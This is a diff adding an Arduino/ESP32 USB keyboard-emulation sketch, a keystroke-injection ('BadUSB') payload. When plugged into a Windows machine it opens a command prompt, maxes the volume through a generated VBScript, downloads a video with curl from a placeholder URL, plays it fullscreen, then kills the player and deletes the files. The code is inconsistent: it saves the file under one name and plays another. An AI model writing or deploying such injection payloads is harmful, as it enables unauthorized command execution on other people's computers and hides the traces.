@@ -1,0 +1,78 @@
+#include "USB.h"
+#include "USBHIDKeyboard.h"  
+                                        // Libraries
+
+
+USBHIDKeyboard Keyboard;  
+
+void setup() {
+  
+  USB.begin();
+  Keyboard.begin();
+                                // Keyboard initialization
+
+
+  delay(3000); 
+  Keyboard.press(KEY_LEFT_GUI);  
+  delay(10);
+  Keyboard.print("r");      
+  delay(10); 
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.write(HID_KEY_C);
+  Keyboard.write(HID_KEY_M);
+  Keyboard.write(HID_KEY_D);
+  delay(10);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(2000);
+                                            // Open CMD
+
+  
+  Keyboard.print("echo for i=1 to 50: CreateObject(\"WScript.Shell\").SendKeys chr(175): next > v.vbs && cscript //nologo v.vbs && del v.vbs");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(50);
+                                        // Setting the lighting to maximum
+  
+  Keyboard.print("cd C:\\");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(50);
+                                            // Switch to drive C
+
+  
+  Keyboard.print("mkdir \"folders\" ");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(50);
+
+
+                                        // Creating folders
+  Keyboard.print("cd C:\\folders\\");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(50);
+                                       // Open folders
+                                       //                     Example
+                                       //                        \/
+  Keyboard.print("curl -L -o \"NameVideo.mp4\" \"https://github.com/User/Repository/Video.mp4\" && start wmplayer.exe \"C:\\folders\\Video.mp4\" /fullscreen && timeout /t 15 /nobreak && taskkill /f /t /im wmplayer.exe && timeout /t 1 /nobreak && del /f /q C:\\folders\\* && cd C:\\ && rmdir /s /q C:\\folders && exit");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+                                      // Downloading a video via a link, playing it, a delay, and then deletion.
+
+}
+
+void loop() {
+
+}
+
+
+
+
+
+
+
+
+
+
